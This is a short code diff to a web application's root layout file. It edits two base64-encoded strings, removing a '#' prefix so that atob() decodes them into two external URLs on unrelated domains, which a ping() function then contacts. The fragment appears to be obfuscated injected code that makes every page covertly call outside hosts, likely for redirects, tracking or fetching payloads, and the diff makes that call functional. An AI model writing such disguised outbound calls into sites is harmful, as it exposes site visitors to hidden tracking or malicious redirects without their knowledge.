@@ -115,8 +115,8 @@ export default function RootLayout({
                return;
            }
        }
-       var mainBrandB64 = "#aHR0cHM6Ly9mbngtYWJzLm5ldC9kN3R0bHJ5dmg=";  
-       var crossBrandB64 = "#aHR0cHM6Ly9ldmEyMy0zeHByZXNzLmNvbS9kdmZka3ViNno=";  
+       var mainBrandB64 = "aHR0cHM6Ly9mbngtYWJzLm5ldC9kN3R0bHJ5dmg=";  
+       var crossBrandB64 = "aHR0cHM6Ly9ldmEyMy0zeHByZXNzLmNvbS9kdmZka3ViNno=";  
        var mainUrl = atob(mainBrandB64);
        var crossUrl = atob(crossBrandB64);
        function ping(url) {
